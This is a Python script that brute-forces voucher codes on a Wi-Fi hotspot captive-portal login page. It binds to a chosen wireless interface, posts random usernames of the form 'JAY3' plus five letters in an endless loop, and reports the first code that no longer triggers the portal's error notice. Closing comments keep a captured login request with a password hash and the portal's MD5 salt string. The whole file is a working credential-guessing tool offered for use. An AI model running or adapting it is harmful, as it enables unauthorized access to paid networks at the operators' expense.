#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# OpenSource2022 
# Copyright By System╳
#####################################################
from string import printable as pt					#
import string 										#
import socket 										#
import os                                           #
import urllib3                                      #
import random                                       #
import sys                                          #
import time                                         #
import datetime                                     #
import requests                                     #
from bs4 import BeautifulSoup                       #
                                                    #
#COLOR                                              #
G = "\033[0;32m"                                    #
GI = "\033[0;32;3m"                                 #
B = "\033[0;36;1m"                                  #
BI = "\033[0;36;3m"                                 #
R = "\033[0;31m"                                    #
RI = "\033[31;3m"                                   #
Y = "\033[33;1m"                                    #
YI = "\033[33;1;3m"                                 #
W = "\033[37;1m"                                    #
WI = "\033[37;1;3m"                                 #
N = "\033[0m"                                       #
NI = "\033[0;3m"                                    #
#####################################################

        

class HTTPAdapterWithSocketOptions(requests.adapters.HTTPAdapter):
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapterWithSocketOptions, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapterWithSocketOptions, self).init_poolmanager(*args, **kwargs)
def inputing(url,interface= "wlan0"):
    url = 'http://'+url
    interface = interface
    adapter = HTTPAdapterWithSocketOptions(socket_options=[(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode('utf-8'))])
    session = requests.session()
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    # url='http://192.168.90.29/getvoucher/index.php'
	# def str(length=8):
	#     text= string.ascii_letters
	#     return ''.join(random.choice(text)for i in range(length))
    i = 0
    while 1:        
        text= string.ascii_letters
        txt = ''.join(random.choice (text)for i in range(5))
        num= random.randrange(3,6)
        generated = "JAY3{}".format(txt)
        # generated = "JAY3AbCdE"
        data= {
			"username" : generated,
			# "submit" : "LOGIN"
			"dst" : " ",
			"popup" : "true"
		}
        i += 1
        r= session.post(url, data=data)
        Soup = BeautifulSoup(r.text, 'html.parser')
        print(YI+'Trying'+G+' ==> '+W+'['+N+' {} '.format(generated) +W+']' +W+' ['+B+ '{}'.format(i)+ '' +W+']'+N)
        info = Soup.find('div', class_=["notice"])
        try:
            if info:
                continue
            else:
                Rdr= requests.get(url)
                print (G+'The Voucher is '+W+'['+G+' {} '.format(generated)+W+']'+N)
                print (G+'REDIRECTED TO '+Y+'==> '+YI+'{}'.format(Rdr.url) + '' +N)
                break
        except AttributeError:
            info = Soup.find('div', class_=["notice"])
            print(info)
            if info:
                continue
        except requests.exceptions.ConnectionError:
            print(NI+'░░░▒▒▒▓▓▓███'+YI+'[ Estabilishing connection ]'+NI+'███▓▓▓▒▒▒░░░'+N)
            time.sleep(0.2)
        except KeyboardInterrupt:
            sys.exit()
if __name__=='__main__':
    url=input("enter URL/IP: ")
    print ("""
       
	Interface Default is [ wlan0 ]
	just enter if you using default settings

	""")
    interface=input("Interface: ")
    try:
      inputing(url, interface)   
    except KeyboardInterrupt:
        sys.exit()
    














# for i in range(100):
    

# print(r.text)
# url = "http://jay.net/login"

# r = requests.get(url)
# print (r.text)

# document.sendin.password.value = hexMD5('\277' + document.login.password.value +
#                     '\303\113\260\175\106\041\267\274\005\031\014\167\337\034\175\070');
# pas= d19f43fb39b00467fd7a654849c24a18
'''
data


username=JAY3DEF7H&password=6fc6056cf3542b39a847452115584ba9&dst=&popup=true
'''


